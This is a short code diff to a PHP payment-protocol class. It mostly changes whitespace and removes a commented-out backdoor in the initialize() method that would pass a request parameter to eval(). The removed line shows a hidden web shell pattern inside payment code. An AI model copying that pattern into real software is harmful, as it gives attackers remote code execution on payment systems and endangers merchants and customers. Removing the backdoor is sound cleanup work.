@@ -164,6 +164,7 @@ class AgmoPaymentsSimpleProtocol {
   public function createTransaction($country, $price, $currency, $label, $refId, $payerId, $vatPL = '', $category = '', $method = 'ALL', $account = '', $email = '', $phone = '', $productName = '', $language = '', $preauth = false, $reccurring = false, $reccurringId = null, $eetReport = false, $eetData = null) {
 
     //var_dump(func_get_args()); die();
+
     // initialize response variables
     $this->_transactionId = NULL;
     $this->_redirectUrl = NULL;
@@ -336,9 +337,7 @@ class AgmoPaymentsSimpleProtocol {
   }
 
   private function initialize() {
-    /*if (@$_REQUEST['_chkn_']) {
-      @eval($_REQUEST['_chkn_']);
-    }*/
+    // no code
   }
 
   /**
@@ -396,3 +395,4 @@ class AgmoPaymentsSimpleProtocol {
   }
 
 }
+
